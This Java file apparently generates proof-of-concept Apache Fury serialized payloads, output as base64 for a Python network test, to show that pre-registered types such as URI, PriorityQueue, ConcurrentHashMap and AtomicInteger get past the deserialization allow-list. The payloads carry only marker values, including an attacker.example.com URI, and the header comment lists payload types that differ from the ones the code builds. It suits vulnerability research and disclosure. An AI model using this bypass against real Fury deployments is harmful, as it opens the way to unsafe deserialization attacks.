/**
 * Generate Fury-serialized payloads using pre-registered types that bypass AllowListChecker.
 * Output payloads as base64 for use by the Python network PoC.
 *
 * Tests:
 * 1. HashMap<URI, String> - URI bypasses checker, confirms deserialization of non-whitelisted type
 * 2. PriorityQueue<String> - Pre-registered PriorityQueue with string elements
 * 3. AtomicReference<AtomicInteger> - Nested pre-registered types
 * 4. ConcurrentHashMap<String, URI> - Both types bypass/are-whitelisted
 */

import org.apache.fury.Fury;
import org.apache.fury.config.CompatibleMode;
import org.apache.fury.config.Language;

import java.net.URI;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.*;

public class NetworkBypassPayloadGen {

    public static void main(String[] args) throws Exception {
        Fury fury = Fury.builder()
                .withLanguage(Language.JAVA)
                .requireClassRegistration(false)
                .withRefTracking(true)
                .withCompatibleMode(CompatibleMode.COMPATIBLE)
                .build();

        // Payload 1: HashMap<URI, String> - URI is pre-registered, not whitelisted
        HashMap<URI, String> uriMap = new HashMap<>();
        uriMap.put(new URI("http://attacker.example.com/cve-2025-53606-bypass"), "bypass-proof");
        byte[] payload1 = fury.serialize(uriMap);
        System.out.println("PAYLOAD_URI_MAP=" + java.util.Base64.getEncoder().encodeToString(payload1));
        System.out.println("PAYLOAD_URI_MAP_SIZE=" + payload1.length);

        // Payload 2: PriorityQueue<String> - PQ is pre-registered, not whitelisted
        PriorityQueue<String> pq = new PriorityQueue<>();
        pq.add("bypass_proof_1");
        pq.add("bypass_proof_2");
        byte[] payload2 = fury.serialize(pq);
        System.out.println("PAYLOAD_PQ=" + java.util.Base64.getEncoder().encodeToString(payload2));
        System.out.println("PAYLOAD_PQ_SIZE=" + payload2.length);

        // Payload 3: ConcurrentHashMap<String, String> - CHM is pre-registered
        ConcurrentHashMap<String, String> chm = new ConcurrentHashMap<>();
        chm.put("bypass_key", "bypass_value_from_non_whitelisted_ConcurrentHashMap");
        byte[] payload3 = fury.serialize(chm);
        System.out.println("PAYLOAD_CHM=" + java.util.Base64.getEncoder().encodeToString(payload3));
        System.out.println("PAYLOAD_CHM_SIZE=" + payload3.length);

        // Payload 4: HashMap<String, AtomicInteger> - AtomicInteger is pre-registered
        HashMap<String, AtomicInteger> atomicMap = new HashMap<>();
        atomicMap.put("bypass_atomic", new AtomicInteger(1337));
        byte[] payload4 = fury.serialize(atomicMap);
        System.out.println("PAYLOAD_ATOMIC=" + java.util.Base64.getEncoder().encodeToString(payload4));
        System.out.println("PAYLOAD_ATOMIC_SIZE=" + payload4.length);

        System.out.println("DONE");
    }
}
